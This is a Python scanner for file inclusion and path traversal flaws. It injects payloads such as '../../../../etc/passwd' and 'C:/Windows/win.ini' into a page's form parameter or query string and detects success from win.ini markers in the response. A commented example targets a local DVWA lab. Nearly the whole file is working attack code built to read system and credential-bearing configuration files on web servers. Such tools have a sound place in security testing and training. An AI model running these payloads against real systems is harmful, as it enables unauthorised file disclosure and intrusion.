import requests
from bs4 import BeautifulSoup
payload = ('C:/../../../../Windows/win.ini', 'C:/Windows/win.ini', 'c:/windows/php.ini', 'c:/windows/my.ini',
           '../../../../../../etc/passwd',
           '../../../../../../../../etc/sysconfig/iptables',
           '../../../../../../../../../../usr/local/app/php5/lib/php.ini')


def mode_fileInclude(url_to_fl, cookie):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Cookie": cookie
    }
    r = requests.get(url_to_fl, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    select_tag = soup.find('select')
    name_attr = ''
    if select_tag:
        name_attr = select_tag.get('name')
    for p in payload:
        r = requests.get(url_to_fl + '?' + name_attr + '=' + p + '&submit=提交查询', headers=headers)
        if 'extensions' in r.text and 'fonts' in r.text:
            return True, url_to_fl, p, "file_include_yes"
        if "=" in url_to_fl:
            url_Re = url_to_fl.split('=', 1)[0] + "=" + p
            if "url" in url_Re:
                return False, url_to_fl
            r = requests.get(url_Re, headers=headers)
            if 'extensions' in r.text and 'fonts' in r.text:
                return True, url_to_fl, p, "file_include_yes"
    return False, url_to_fl

# url = "http://localhost:8080/DVWA-master/DVWA-master/vulnerabilities/fi/?page=file1.php"
# print(mode_fileInclude(url, "security=low; PHPSESSID=hq26cug4vtdvfofodms4g4abp8"))
